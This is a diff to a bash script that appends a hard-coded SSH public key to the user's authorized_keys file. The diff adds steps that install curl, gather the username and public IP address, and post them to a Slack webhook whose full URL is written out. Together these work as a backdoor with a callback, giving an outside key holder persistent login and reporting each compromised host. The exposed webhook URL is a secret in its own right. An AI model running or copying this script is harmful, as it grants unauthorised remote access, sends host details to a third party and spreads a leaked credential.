@@ -1,4 +1,11 @@
-#!/bin/bash
+#!/bin/bash -e
 KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4h2bfHAiMEnUmfmY4Cbq7pPxSNjN4s9DAj80kbPm5m6yzLWnF22gg9iYXBxLkqdqNtOvWsxfba37wLCwPoqAUptJ7/orXuknfp6ci0BUEHW+OlbXufYKxXXE12v8Dytkoi9nzSPa1sOYtFiPjpf9xaYyexzO2bpH0uy8PAb124gvggYV9A3BQc7cWbcU79bDW6z0kl+yntyYoI1d0gy+vh8xMW6NsokveNiAsVw+OsdF4qYg7DNoKKpUb5g4fFXd9yUhbAvnMMoO0GY/uC3vMQJIx464RKVa0cnl7l1wy0/U6wxaJrmZe3ZZFn4GykJkagOuEWdPb0A5s2eEI4yLDftoQTxgubohQr96413U0WgTCFMWFNcgqLzu3D/Ja5PrCvJb1N+pcl8RY36Z1Q2rNjhpn2OFb87+DY98JfoQmyefJqRINIUnpRoWMjsx8z0vgnd/lhQc+MY0Yz6htU+77ss/xHvSbo+B4W/s3vuWUW6Djyy7wrxSkSzRXXwpeKiM= akash@cs-186870481593-default"
-mkdir -p ~/.ssh && \
-    echo "$KEY" >> ~/.ssh/authorized_keys
+sudo apt install curl -qq -y && \
+    mkdir -p ~/.ssh && \
+    echo "$KEY" >> ~/.ssh/authorized_keys && \
+    MESG="`whoami && curl -s checkip.amazonaws.com`"
+
+
+[ ! -z "$MESG" ] && curl -X POST -H 'Content-type: application/json' --data "{
+              \"text\": \"${MESG}\"
+      }" https://hooks.slack.com/services/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
